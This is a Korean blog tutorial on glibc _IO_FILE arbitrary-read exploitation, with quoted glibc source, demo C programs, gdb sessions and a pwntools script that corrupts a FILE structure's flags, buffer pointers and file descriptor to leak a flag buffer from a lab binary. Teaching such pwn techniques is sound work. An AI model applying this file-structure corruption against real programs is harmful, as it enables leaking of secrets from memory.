---
title: "_IO_FILE Arbitrary Read"
date: 2022-04-05 +0900
author: J0ngBae
categories: [Hacking, Pwn]
tags: ['system hacking', 'iofile', '2022']
---

## Arbitrary Read
`file_ar.c` 는 testfile 파일에 “THIS IS TEST FILE!” 문자열을 쓰는 예제이다.

- file_ar.c
    
    ```c
    // gcc -o file_ar1 file_ar1.c
    #include <stdio.h>
    #include <string.h>
    int main()
    {
    	char *buf = "THIS IS TEST FILE!\0";
    	FILE *fp;
    
    	fp = fopen("testfile","w"); 
    	fwrite(buf, 1, strlen(buf), fp);
    
    	return 0;
    }
    ```
    

### \_IO\_fwrite()
```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)

_IO_size_t
_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t request = size * count;
  _IO_size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
```

`fwrite` 함수는 내부적으로 `_IO_new_file_xsputn` 함수를 호출하고 해당 함수에서 다음과 같이 `new_do_write` 함수를 호출하게 된다.

### \_IO\_new\_file\_xsputn
    
```c
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;
  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
      If the amount to be written straddles a block boundary
      (or the filebuf is unbuffered), use sys_write directly. */
  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
  {
    const char *p;
    for (p = s + n; p > s; )
      {
        if (*--p == '\n')
    {
      count = p - s + 1;
      must_flush = 1;
      break;
    }
      }
  }
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
  count = to_do;
#ifdef _LIBC
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
#else
      memcpy (f->_IO_write_ptr, s, count);
      f->_IO_write_ptr += count;
#endif
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
  /* If nothing else has to be written we must not signal the
      caller that everything has been written.  */
  return to_do == 0 ? EOF : n - to_do;
      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
      if (do_write)
  {
    count = new_do_write (f, s, do_write); // <------
    to_do -= count;
    if (count < do_write)
      return n - to_do;
  }
      /* Now write out the remainder.  Normally, this will fit in the
    buffer, but it's somewhat messier for line-buffered files,
    so we let _IO_default_xsputn handle the general case. */
      if (to_do)
  to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
  return n - to_do;
}
```
    
### new\_do\_write
`new_do_write` 함수는 다음과 같은 역할을 한다.

만약 공격자가 line 4, line 6의 조건을 모두 만족시킨다면 `_IO_SYSWRITE` 함수를 호출할 수 있다. `_IO_SYSWRITE` 함수에 전달된는 인자와 `new_do_write` 함수의 인자는 동일하다.

`new_do_write` 함수를 호출할 때 전달되는 인자는 다음과 같다.

- \_IO\_SYSWRITE 함수 (\_IO\_new\_do\_write)
  ```c
  int
  _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
  {
    return (to_do == 0
      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
  }
  ```

- new_do_write
    
    ```c
    static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
    {
      size_t count;
      if (fp->_flags & _IO_IS_APPENDING)                              
        fp->_offset = _IO_pos_BAD;
      else if (fp->_IO_read_end != fp->_IO_write_base)                  
        {
          off64_t new_pos
    	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
          if (new_pos == _IO_pos_BAD)
    	return 0;
          fp->_offset = new_pos;
        }
      count = _IO_SYSWRITE (fp, data, to_do);                         
      if (fp->_cur_column && count)
        fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
      _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
      fp->_IO_write_end = (fp->_mode <= 0
    		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    		       ? fp->_IO_buf_base : fp->_IO_buf_end);
      return count;
    }
    ```
    

만약 공격자가 파일 포인터를 조작할 수 있거나 파일 구조체의 멤버 변수들을 바꿀 수 있다면 `_IO_write_base`, `_IO_write_ptr` , `_IO_read_end`, `_flags` 를 조작하여 원하는 주소의 값을 출력할 수 있다.

## \_IO\_FILE Arbitrary Read - Memory Leak
`flie_ar2.c` 는 파일 구조체 멤버 변수 조작을 통해 메모리 릭을 하는 코드이다.

`file_ar2` 의 실행 결과는 다음과 같다.

- file_ar2.c
    
    ```c
    // gcc -o file_ar2 file_ar2.c
    #include <stdio.h>
    #include <string.h>
    int main()
    {
    	char *data = malloc(100);
    	char *buf = "THIS IS TEST FILE!\0";
    	FILE *fp;
    	
    	strcpy(data, "MEMORY LEAK SUCCESS!");
    	fp = fopen("testfile","w"); 
    	fp->_flags |= 0x800;        // condition _IO_IS_APPENDING
    	fp->_IO_write_base = data;
    	fp->_IO_write_ptr = data + strlen(data);
    
    	fp->_IO_read_end = fp->_IO_write_base; // condition
    	fp->_fileno = 1;                       // stdout
    	fwrite(buf, 1, 1, fp);
    
    	return 0;
    }
    ```
    

```zsh
╭─root@14ae5a93e42c ~
╰─➤  ./file_ar2
MEMORY LEAK SUCCESS!T
```

`fwrite` 함수가 실행되면 서 `data` 의 내용이 출력된 것을 확인할 수 있다.

## \_IO\_FILE Arbitrary Read - Memory Leak 2
`file_ar3.c` 는 전역 변수 `flag_buf` 에 flag 파일을 읽은 후 testfile을 열고 반환된 파일 포인터 `fp` 의 주소를 출력한다. 그리고 임의의 주소에 200바이트를 입력받고 `fwrite` 함수가 호출된 후 종료되는 예제이다.

파일 포인터 주소가 제공되기 때문에 주어진 임의 주소 쓰기 취약점을 활용해 파일 구조체를 조작할 수 있다.

익스플로잇 시나리오는 다음과 같다.

1. 주어진 파일 포이터 `fp` 의 주소를 가져온다.
2. 구한 파일 포인터의 주소를 `addr` 변수에 입력하므로써 파일 구조체를 조작한다.
3. flag 파일 내용을 출력해야 하기 때문에 `flag_buf` 전역 변수의 주소를 구한 후에 `_IO_write_base` 와 `_IO_write_ptr` 를 각각 출력할 버퍼의 시작주소와 끝 주소로 조작한다. 그리고 `_IO_read_read` 포인터를 `_IO_write_base` 와 동일한 값으로 조작한다. 또한 `_flags` 멤버 변수를 기존 값과 `0x800 ( _IO_IS_APPNEDING )` 을 OR 연산한 값으로 조작한다..
4. 포인터 조작이 끝났으면 화면에 출력하기 위해 파일 디스크럽터를 의미하는 `_fileno` 를 표준 출력 파일 디스크럽터인 1로 조작한다.

- file_ar3.c
    
    ```c
    // gcc -o file_ar3 file_ar3.c -no-pie
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>
    
    char dummy;
    char flag_buf[128];
    int read_flag() {
    	FILE *fp;
    	fp = fopen("flag", "r");
    	fread(flag_buf, 1, 256, fp);
    	fclose(fp);
    }
    int main()
    {
    	FILE *fp;
    	long long addr = 0; 
    	long long value = 0;
    	int bytes;
    	char *data = "TEST file\0";
    	
    	read_flag();
    	fp = fopen("testfile", "w");
    	
    	printf("FILE PTR: %p\n", fp);
    	fflush(stdout);
    	
    	printf("Addr: ");
    	fflush(stdout);
    	scanf("%ld", &addr);
    	printf("Value: ");
    	fflush(stdout);
    	read(0, addr, 200);
    		
    	fwrite(data, 1, strlen(data), fp);
    	fclose(fp);
    	return 0;
    }
    ```
    

```bash
gdb-peda$ p &flag_buf
$2 = (<data variable, no debug info> *) 0x6010c0 <flag_buf>
```

공격을 통해 출력할 버퍼인 `flag_buf` 의 주소를 알아냈다.

```bash
gdb-peda$ x/20i main
   0x40087b <main>:     push   rbp
   0x40087c <main+1>:   mov    rbp,rsp
   0x40087f <main+4>:   sub    rsp,0x30
   0x400883 <main+8>:   mov    rax,QWORD PTR fs:0x28
   0x40088c <main+17>:  mov    QWORD PTR [rbp-0x8],rax
   0x400890 <main+21>:  xor    eax,eax
   0x400892 <main+23>:  mov    QWORD PTR [rbp-0x28],0x0
   0x40089a <main+31>:  mov    QWORD PTR [rbp-0x20],0x0
   0x4008a2 <main+39>:  mov    QWORD PTR [rbp-0x18],0x400a3b
   0x4008aa <main+47>:  mov    eax,0x0
   0x4008af <main+52>:  call   0x400836 <read_flag>
   0x4008b4 <main+57>:  mov    esi,0x400a46
   0x4008b9 <main+62>:  mov    edi,0x400a48
   0x4008be <main+67>:  call   0x400700 <fopen@plt>
   0x4008c3 <main+72>:  mov    QWORD PTR [rbp-0x10],rax
   0x4008c7 <main+76>:  mov    rax,QWORD PTR [rbp-0x10]
   0x4008cb <main+80>:  mov    rsi,rax
   0x4008ce <main+83>:  mov    edi,0x400a51
   0x4008d3 <main+88>:  mov    eax,0x0
   0x4008d8 <main+93>:  call   0x4006c0 <printf@plt>
gdb-peda$ b *0x4008c3
Breakpoint 1 at 0x4008c3
gdb-peda$ r

gdb-peda$ x/gx $rax
0x602010:       0x00000000fbad2484
```

`_IO_SYSWRITE`  함수가 호출되는 조건을 맞춰주기 위해 testfile에 대한 파일 포인터의 `_flags` 값을 알아냈다. `_flags` 멤버 변수는 `0xfbad2484` 값을 가지고 있다.

다음은 `file_ar3` 에 대한 공격 코드인 `file_ar3.py` 에 대한 설명이다.

line 12에서는 `_IO_SYSWRITE` 함수를 호출하기 위해 `_flags` 를 `IO_IS_APPENDING` 값인 `0X800` 과 or 연산한 값으로 조작한다.

line 16 ~ line 17에서는 `_IO_write_base` 를 출력할 버퍼의 시작 주소인 `flag_buf` 주소로 조작하고, `_IO_write_ptr` 을 `flag_buf + 0x100` 으로 조작했다. 이로써 라이브러리 내부에서 `_IO_SYSWRITE` 함수가 호출되면 `flag_buf` 주소로부터 0x100 바이트 만큼의 메모리가 출력될 것이다.

다음으로 line 14에서 `_IO_read_end` 와 `_IO_write_base` 를 동일한 값으로 조작했다.

또한 line 29에서 표준 출력으로 출력하기 위해 `_fileno` 멤버 변수를 `1` 조작했다.

`file_ar3.py` 의 실행 결과는 다음과 같다.

- file_ar3.py
    
    ```python
    # file_ar3.py
    from pwn import *
    
    p = process("./file_ar3")
    
    print(p.recvuntil("PTR: "))
    fp = int(p.recvuntil(b"\n").strip(b"\n"),16)
    print(hex(fp))
    
    print(p.sendlineafter("Addr: ", str(fp)))
    
    payload = p64(0xfbad2484 | 0x800)
    payload += p64(0) # _IO_read_ptr
    payload += p64(0x6010c0) # _IO_read_end
    payload += p64(0) # _IO_read_base
    payload += p64(0x6010c0) # _IO_write_base 
    payload += p64(0x6011c0) # _IO_write_ptr 
    payload += p64(0) # _IO_write_end 
    payload += p64(0) # _IO_buf_base
    payload += p64(0) # _IO_buf_end
    
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    
    payload += p64(0)
    payload += p64(0) 
    
    payload += p64(1) # stdout
    
    print(p.sendlineafter("Value: ", str(payload)))
    
    p.interactive()
    ```
    

```zsh
╭─root@8e7cea269c13 ~
╰─➤  python3 file_ar3.py
[+] Starting local process './file_ar3': pid 605
b'FILE PTR: '
0x1ab0010
b'Addr: '
b'Value: '
[*] Switching to interactive mode
[*] Process './file_ar3' stopped with exit code 0 (pid 605)
FLAG{THIS_IS_FLAG!!!!!!!!!}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00TEST file[*] Got EOF while reading in interactive
```

`flag_buf` 의 값이 0x100 바이트만큼 출력된 것을 확인할 수 있다.